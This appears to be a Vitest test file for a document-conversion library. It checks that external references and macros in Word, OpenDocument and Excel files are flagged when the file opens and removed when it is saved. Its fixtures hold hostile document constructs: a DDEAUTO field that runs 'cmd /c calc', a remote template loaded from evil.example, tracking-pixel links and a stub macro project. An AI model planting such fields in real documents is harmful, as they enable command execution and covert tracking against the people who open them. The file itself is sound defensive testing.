// @vitest-environment jsdom

/** What a document would fetch from outside or run is listed when it opens, and gone once it is saved. */

import { describe, it, expect } from 'vitest';
import { decodeBlock, encodeBlock } from '../src/js/core/package.js';
import { readDocx } from '../src/js/core/formats/docx-read.js';
import { writeDocx } from '../src/js/core/formats/docx-write.js';
import { readOdt } from '../src/js/core/formats/odt-read.js';
import { writeOdt } from '../src/js/core/formats/odt-write.js';
import { readXlsx } from '../src/js/core/formats/xlsx.js';

const pkg = (entries) => decodeBlock(encodeBlock(Object.entries(entries).map(([name, data]) => ({ name, data }))));
const RELS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"';
const T = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';

const trapped = () => pkg({
  '[Content_Types].xml': '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
  '_rels/.rels': `<Relationships ${RELS}><Relationship Id="r1" Type="${T}/officeDocument" Target="word/document.xml"/></Relationships>`,
  'word/document.xml': `<w:document ${W}><w:body>
    <w:p><w:r><w:t>Hello</w:t></w:r></w:p>
    <w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDEPICTURE "http://tracker.example/p.png" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
    <w:p><w:fldSimple w:instr=" DDEAUTO cmd &quot;/c calc&quot; "/></w:p>
    <w:p><w:hyperlink r:id="h1"><w:r><w:t>a link</w:t></w:r></w:hyperlink></w:p>
  </w:body></w:document>`,
  'word/_rels/document.xml.rels': `<Relationships ${RELS}>
    <Relationship Id="i1" Type="${T}/image" Target="http://tracker.example/pixel.gif" TargetMode="External"/>
    <Relationship Id="h1" Type="${T}/hyperlink" Target="https://example.org/" TargetMode="External"/>
  </Relationships>`,
  'word/_rels/settings.xml.rels': `<Relationships ${RELS}><Relationship Id="t1" Type="${T}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`,
  'word/vbaProject.bin': new Uint8Array([1, 2, 3]),
});

describe('references to the outside and macros', () => {
  it('are listed when a Word document opens, and a plain link is not', () => {
    const lines = readDocx(trapped()).losses.lines();
    expect(lines).toContain('A picture linked from tracker.example, never fetched');
    expect(lines).toContain('A template linked from evil.example, never fetched');
    expect(lines).toContain('Macros, never run and not kept');
    expect(lines.some((line) => /INCLUDEPICTURE field/.test(line))).toBe(true);
    expect(lines.some((line) => /DDEAUTO field/.test(line))).toBe(true);
    expect(lines.join('\n')).not.toMatch(/example\.org/);
  });

  it('are gone once the document is written again', () => {
    const { document, images } = readDocx(trapped());
    const written = writeDocx(document, images).entries;
    const text = written.map((entry) => (typeof entry.data === 'string' ? entry.data : new TextDecoder().decode(entry.data))).join('\n');
    expect(text).not.toMatch(/tracker\.example|evil\.example|INCLUDEPICTURE|DDEAUTO|vbaProject/);
    expect(written.some((entry) => /vbaProject/.test(entry.name))).toBe(false);
  });

  it('are listed in an OpenDocument text, macros included', () => {
    const content = `<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0">
      <office:body><office:text><text:p>Hi<draw:frame><draw:image xlink:href="https://tracker.example/x.png" xlink:type="simple"/></draw:frame><draw:frame><draw:image xlink:href="Pictures/inside.png"/></draw:frame></text:p></office:text></office:body></office:document-content>`;
    const source = pkg({ mimetype: 'application/vnd.oasis.opendocument.text', 'content.xml': content, 'Basic/Standard/Module1.xml': '<x/>' });
    const read = readOdt(source);
    const lines = read.losses.lines();
    expect(lines).toContain('A picture linked from tracker.example, never fetched');
    expect(lines).toContain('Macros, never run and not kept');
    expect(lines.join('\n')).not.toMatch(/inside\.png/);
    const written = writeOdt(read.document, read.images).entries;
    expect(written.some((entry) => entry.name.startsWith('Basic/'))).toBe(false);
    expect(written.map((entry) => String(entry.data)).join('\n')).not.toMatch(/tracker\.example/);
  });

  it('are listed in a workbook that links to others', () => {
    const source = pkg({
      '[Content_Types].xml': '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
      '_rels/.rels': `<Relationships ${RELS}><Relationship Id="r1" Type="${T}/officeDocument" Target="xl/workbook.xml"/></Relationships>`,
      'xl/workbook.xml': '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S" sheetId="1" r:id="s1"/></sheets></workbook>',
      'xl/_rels/workbook.xml.rels': `<Relationships ${RELS}><Relationship Id="s1" Type="${T}/worksheet" Target="worksheets/sheet1.xml"/></Relationships>`,
      'xl/worksheets/sheet1.xml': '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>',
      'xl/externalLinks/externalLink1.xml': '<externalLink/>',
      'xl/externalLinks/_rels/externalLink1.xml.rels': `<Relationships ${RELS}><Relationship Id="e1" Type="${T}/externalLinkPath" Target="file:///C:/secret/budget.xlsx" TargetMode="External"/></Relationships>`,
      'xl/connections.xml': '<connections/>',
    });
    const lines = readXlsx(source).losses.lines();
    expect(lines).toContain('Data linked from another workbook, never read');
    expect(lines).toContain('Data linked from another file, never read');
    expect(lines).toContain('A connection to outside data, never opened');
  });
});
